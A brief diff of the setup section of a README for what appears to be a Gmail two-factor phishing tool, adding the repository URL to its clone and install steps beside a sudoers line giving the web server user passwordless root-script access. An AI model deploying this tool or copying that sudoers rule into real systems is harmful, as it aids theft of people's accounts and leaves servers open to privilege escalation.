@@ -46,7 +46,7 @@ www-data ALL=NOPASSWORD: pathtoscript/root.sh
 ## How to run
 
 ```
-git clone
+git clone https://github.com/afernandezb92/2FAGmailPhising.git
 cd 2FAGmailPhising
 pip install -r requirements.txt
 chmod +x run.sh
